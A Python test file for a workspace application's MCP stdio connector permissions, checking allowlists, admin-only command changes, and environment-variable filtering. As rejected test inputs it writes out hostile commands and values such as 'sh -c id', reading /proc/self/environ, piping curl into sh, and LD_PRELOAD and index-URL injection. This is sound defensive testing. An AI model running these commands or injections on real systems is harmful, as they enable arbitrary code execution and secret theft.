"""Catalogue stdio connectors: a person sets only the asked credentials, never the command."""

from __future__ import annotations

import pytest
from fastapi import HTTPException
from test_default_connectors import _people, _request, _server, _time, db  # noqa: F401

from app.models.workspace import Connector, ConnectorStatus, ConnectorTool, Transport
from app.routers import connectors
from app.schemas.workspace import ConnectorIn, ConnectorPatch, InstallRequest
from app.services import mcp
from app.services.tools import catalog, registry

ALLOWED = "uvx mcp-server-wiki --read-only"


def _allow(monkeypatch, *lines: str) -> None:
    async def allowlist():
        return list(lines)

    monkeypatch.setattr(catalog, "stdio_allowlist", allowlist)


async def _refused(call) -> tuple[int, str]:
    with pytest.raises(HTTPException) as refused:
        await call
    return refused.value.status_code, str(refused.value.detail)


async def test_a_catalogue_connector_takes_only_the_credentials_it_asks_for(
        db, monkeypatch):  # noqa: F811
    _server(monkeypatch)
    admin, member, _ = await _people(db)
    entry = _time(slug="weather", required_env=[{"key": "API_TOKEN", "label": "토큰"}])
    await connectors.admin_add_entry(entry, admin, db, _request())

    assert await _refused(connectors.install(
        "weather", member, db, InstallRequest(env={"API_TOKEN": "t", "UV_INDEX_URL": "x"}),
    )) == (422, "env_not_allowed:UV_INDEX_URL")
    mine = await connectors.install("weather", member, db, InstallRequest(env={"API_TOKEN": "t"}))

    assert await _refused(connectors.patch(
        mine.id, ConnectorPatch(env={"LD_PRELOAD": "/tmp/x.so"}), member, db,
    )) == (422, "env_not_allowed:LD_PRELOAD")
    assert await _refused(connectors.patch(
        mine.id, ConnectorPatch(endpoint="sh -c id"), member, db,
    )) == (422, "catalogue_endpoint")
    # the credential itself still changes
    await connectors.patch(mine.id, ConnectorPatch(env={"API_TOKEN": "u"}), member, db)
    # an administrator's own copy keeps the whole row
    theirs = await connectors.install("weather", admin, db, InstallRequest(env={"API_TOKEN": "t"}))
    await connectors.patch(theirs.id, ConnectorPatch(env={"UV_INDEX_URL": "x"}), admin, db)


async def test_a_stdio_connector_of_ones_own_is_changed_by_an_administrator_only(db):  # noqa: F811
    _, member, _ = await _people(db)
    own = Connector(owner_id=member.id, name="로컬", slug="local", transport=Transport.stdio,
                    endpoint="uvx some-server")
    web = Connector(owner_id=member.id, name="위키", slug="wiki", transport=Transport.http,
                    endpoint="https://w.example")
    db.add_all([own, web])
    await db.commit()
    for patch in (ConnectorPatch(endpoint="sh -c id"), ConnectorPatch(env={"A": "b"})):
        assert await _refused(connectors.patch(own.id, patch, member, db)) == (
            403, "stdio_requires_admin")
    # switching it off is still the person's
    assert (await connectors.patch(own.id, ConnectorPatch(enabled=False), member, db)).enabled \
        is False
    # a remote server of one's own keeps its address editable
    moved = await connectors.patch(web.id, ConnectorPatch(endpoint="https://v.example"), member,
                                   db)
    assert moved.endpoint == "https://v.example"


async def test_a_member_registers_only_a_stdio_command_an_administrator_allowed(
        db, monkeypatch):  # noqa: F811
    asked = _server(monkeypatch)
    _allow(monkeypatch, ALLOWED)
    admin, member, _ = await _people(db)
    for payload in (
        ConnectorIn(name="셸", transport=Transport.stdio,
                    endpoint="sh -c 'cat /proc/self/environ'"),
        # the program alone is not the command line
        ConnectorIn(name="위키2", transport=Transport.stdio, endpoint="uvx mcp-server-wiki"),
        # env of its own would run other code (a preload, an index URL)
        ConnectorIn(name="위키3", transport=Transport.stdio, endpoint=ALLOWED,
                    env={"LD_PRELOAD": "/tmp/x.so"}),
    ):
        assert await _refused(connectors.add_custom(payload, member, db)) == (
            403, "stdio_requires_admin")
    assert asked == []

    mine = await connectors.add_custom(
        ConnectorIn(name="위키", transport=Transport.stdio, endpoint=ALLOWED), member, db)
    assert mine.status == "connected" and asked == [ALLOWED]
    # moving it to another command is refused as adding one is
    assert await _refused(connectors.patch(
        mine.id, ConnectorPatch(endpoint="sh -c id"), member, db)) == (403, "stdio_requires_admin")
    # an administrator registers any command
    theirs = await connectors.add_custom(
        ConnectorIn(name="관리", transport=Transport.stdio, endpoint="python3 /srv/mcp/x.py",
                    env={"A": "b"}), admin, db)
    assert theirs.status == "connected"


async def test_a_stdio_row_saved_before_the_rule_is_refused_when_it_would_run(
        db, monkeypatch):  # noqa: F811
    _allow(monkeypatch, ALLOWED)
    _, member, _ = await _people(db)
    old = Connector(owner_id=member.id, name="옛것", slug="old", transport=Transport.stdio,
                    endpoint="sh -c 'curl x | sh'", status=ConnectorStatus.connected)
    db.add(old)
    await db.commit()
    db.add(ConnectorTool(connector_id=old.id, name="run", read_only=True, enabled=True))
    await db.commit()

    async def never(*_args, **_kwargs):
        raise AssertionError("a disallowed command was spawned")

    monkeypatch.setattr(mcp, "call_tool", never)
    monkeypatch.setattr(mcp, "list_tools", never)
    [tool] = await registry.connector_tools(db, member)
    result = await tool.run({})
    assert result.failed and "허용하지 않은 실행 명령" in result.content

    synced = await connectors.sync(old.id, member, db)
    assert synced.status == "error" and "허용하지 않은 실행 명령" in (synced.error or "")


def test_a_typed_env_value_never_pulls_out_the_apis_secrets(monkeypatch):
    monkeypatch.setenv("DATABASE_URL", "postgres://secret")
    monkeypatch.setenv("LANG", "ko_KR.UTF-8")
    env = mcp.substitute({"TOKEN": "${DATABASE_URL}", "L": "${LANG}", "ME": "{{USER_ID}}"},
                         user_id="u1", user_email="u@example.com")
    assert env == {"TOKEN": "", "L": "ko_KR.UTF-8", "ME": "u1"}
